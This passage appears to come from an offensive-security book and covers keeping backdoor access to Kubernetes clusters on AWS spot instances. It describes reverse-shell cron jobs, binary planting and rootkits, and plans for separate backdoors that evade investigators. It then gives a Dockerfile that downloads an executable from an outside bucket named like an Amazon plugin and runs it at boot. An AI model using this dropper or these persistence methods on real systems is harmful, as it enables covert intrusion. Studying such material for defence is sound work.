- pgno: 173
  md: '# 9


    # STICKY SHELL


    ![](img/961e81aef23040d0fbe348f58c055860_173_0.png)


    Persistence takes on a whole new dimension when dealing with a volatile and renewable
    infrastructure like Kubernetes. Containers and nodes tend to be treated as immutable
    and disposable objects that can vanish anytime, anywhere.


    This volatility is further aggravated on AWS machines by the use of special types
    called spot instances. At about 40 percent of the regular price, companies can
    spawn a spot instance of almost any type available. The catch is that AWS has
    the power to reclaim the machine whenever it needs the compute power back. While
    this setup seems ideal for a Kubernetes cluster, where containers can be automatically
    moved to healthy machines and new nodes respawned in a matter of seconds, it does
    pose new challenges for reliable long-term backdoors.


    Persistence used to be about backdooring binaries, running secret shells on machines,
    and planting Secure Shell (SSH) keys. None of these options provide stable, long-term
    access in a world where the average lifetime of a machine is a few hours.'
  merge: -1
  img_proc: true
- pgno: 174
  md: 'The good news is using 100 percent spot instances for a cluster poses such
    a heavy risk that no serious company sets up such clusters—at least not to process
    critical workloads. If AWS suddenly spikes in reclaims, the cluster might fail
    to scale fast enough to meet customer demand. For this reason, a common strategy
    for cost-effective resilience is to have a stable part of critical workloads scheduled
    on a minimal base of regular instances and absorb traffic fluctuations with spot
    instances.


    A lazy way to backdoor such a fluctuating infrastructure is to locate this set
    of precious machines—they’re usually the oldest ones in the cluster—and backdoor
    them using the old-fashioned methods. We could set up a cron job that regularly
    pulls and executes a reverse shell. We could use binary planting, where we replace
    common tools like ls, Docker, and SSHD with variants that execute distant code,
    grant root privileges, and perform other mischievous actions. We could insert
    a rootkit, which counts as any modification to the system (libraries, kernel structures,
    and so on) that allows or maintains access (check out a sample rootkit on Linux
    at https://github.com/croemheld/lkm-rootkit/).


    In Listing 9-1, we retrieve machines and order them by their creation timestamp.


    ```

    shell> ./kubectl get nodes -sort-by=.metadata.creationTimestamp


    Name

    ip-192-168-162-15.eu-west-1.... Ready 14 days

    ip-192-168-160-34.eu-west-1.... Ready 14 days

    ip-192-168-162-87.eu-west-1.... Ready 14 days

    ip-192-168-162-95.eu-west-1.... Ready 12 days

    ip-192-168-160-125.eu-west-1.... Ready 9 days

    --snip--

    ```


    Listing 9-1: Finding the oldest nodes to locate the stable section of the cluster


    Each node supports different services, so backdooring a dozen of these nodes should
    give us at least a few days of guaranteed access. The shell will then automatically
    disappear with the node, burying any evidence of our shenanigans. It’s the perfect
    crime.


    > NOTE Well, almost all evidence will be buried. Not all artifacts are solely
    located on the system, so we could leave traces through virtual private cloud
    (VPC) flow logs capturing network packets, CloudTrail logging most API calls,
    and so on.


    But what if a few days isn’t enough time to find a way to Gretsch Politico’s network?
    Can we persist longer somehow? We are, after all, in a setup that could adapt
    and heal itself. Wouldn’t it be magical if it healed our backdoor with it?


    If we start thinking of our backdoor as a container or a pod, then maybe we can
    leverage the dark wizardry of Kubernetes to ensure that at least one copy is always
    up and running somewhere. The risk of such an ambition'
  merge: -1
  img_proc: true
- pgno: 175
  md: 'cannot be taken lightly, however. Kubernetes offers a ridiculous level of insights
    and metrics about all its components, so using an actual Kubernetes pod for our
    backdoor will make it a bit tricky to stay under the radar.


    Persistence is always a game of trade-offs. Should we sacrifice stealth for more
    durable access or keep a very low profile and accept losing our hard-won shell
    at the slightest turbulence? To each their own opinion about the subject, which
    will depend on several factors like their confidence in the anonymity of the attacking
    infrastructure, the target’s security level, their risk appetite, and so forth.


    This ostensibly impossible quandary has one obvious solution, though: multiple
    backdoors with different properties. We’ll have both a stable-yet-somewhat-plain
    backdoor and the stealthy-but-volatile shell. The first backdoor will consist
    of a pod cleverly hidden in plain sight that acts as our main center of operations.
    The pod will regularly beacon back home, looking for commands to execute. This
    also provides direct internet connection, which our current shell lacks. Whenever
    it gets destroyed for whatever reason, Kube will hurry to bring it back to life.
    Parallel to the first backdoor, we’ll drop another, stealthier program that hibernates
    until we send a pre-defined signal. This gives us a secret way back into the system
    should our first backdoor get busted by a curious admin.


    These multiple backdoors should not share any indicator of compromise: they will
    contact different IPs, use different techniques, run different containers, and
    be completely isolated from each other. An investigator who finds one seed with
    certain attributes should not be able to leverage this information to find other
    backdoors. The demise of one should not, in theory, put the others at risk.


    # Stable Access


    The stable backdoor will be able to, for instance, run on a select few of the
    hundreds of nodes available. This rogue container will be a slim image that loads
    and executes a file at boot time. We’ll use Alpine, a minimal distribution of
    about 5MB commonly used to spin up containers.


    In Listing 9-2, we start by writing the Dockerfile to download and run an arbitrary
    file within an Alpine container.


    ```

    #Dockerfile


    FROM alpine


    CMD ["/bin/sh", "-c", "wget https://amazon-cni-plugin-essentials.s3.amazonaws.com/run
    -O /root/run && chmod +x /root/run && /root/run"]

    ```


    Listing 9-2: A Dockerfile to build a container that downloads and runs an executable
    after booting'
